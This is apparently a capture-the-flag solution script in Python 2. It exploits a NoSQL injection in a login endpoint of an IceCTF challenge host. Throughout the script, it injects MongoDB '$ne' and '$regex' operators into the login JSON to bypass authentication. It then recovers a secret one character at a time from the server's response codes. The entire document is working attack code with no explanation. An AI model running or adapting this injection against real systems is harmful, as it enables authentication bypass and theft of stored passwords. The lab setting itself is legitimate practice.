import requests
ascii_letters = 'IabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{-_}'
def url(password):
	 r = requests.post('http://chainedin.vuln.icec.tf/login', json={"user": {"$ne": "1"},"pass":{"$regex":password}})
	 return r.status_code

def comp(flag):
	for i in ascii_letters:
		ch=flag+i+'.*$'
		#print i
		if url(ch)==200:
			flag+=i
			break
	return i

if __name__ == "__main__":
	flag="IceCTF{"
	for x in xrange(1,45):
		flag+=comp(flag)
		print flag